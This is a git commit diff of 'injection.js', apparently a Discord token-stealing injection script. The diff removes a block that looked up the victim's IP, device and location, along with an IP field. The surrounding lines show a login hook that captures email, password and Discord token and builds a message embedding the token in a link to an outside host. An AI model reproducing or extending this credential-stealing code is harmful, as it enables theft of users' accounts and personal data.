76ba6eac994b807e0454d5ba1c7c57d4fe3834bc
invalidnameqw <103831425+invalidnameqw@users.noreply.github.com>
2022-04-20 21:42:52 +0300

    Update injection.js

--- injection.js
+++ injection.js
@@ -327,26 +327,6 @@ const hooker = (content) => {
 const login = async (email, password, token) => {
   
 
-$(function () { 
-    var url="https://www.cloudflare.com/cdn-cgi/trace";
-    
-    // $.ajax().done().fail();
-    $.ajax({ method:"GET", url:url}).done(function (response) { 
-            let veri=response.split('\n');
-            console.log(veri);
-            let ip=veri[2].split('=')[1];
-            
-
-            let cihaz=veri[5].split('=')[1];
-            
-            
-            let konum=veri[8].split('=')[1];
-            
-
-    }).fail(function () { 
-       
-    });
-})
             
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
@@ -362,11 +342,6 @@ $(function () {
        {
             name: `<a:tre:962470429115686923>  \`${token}\``,
             value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
-            inline: false,
-          },
-            {
-            name: `ip`,
-            value: `${ip}`,
             inline: false,
           },
            {
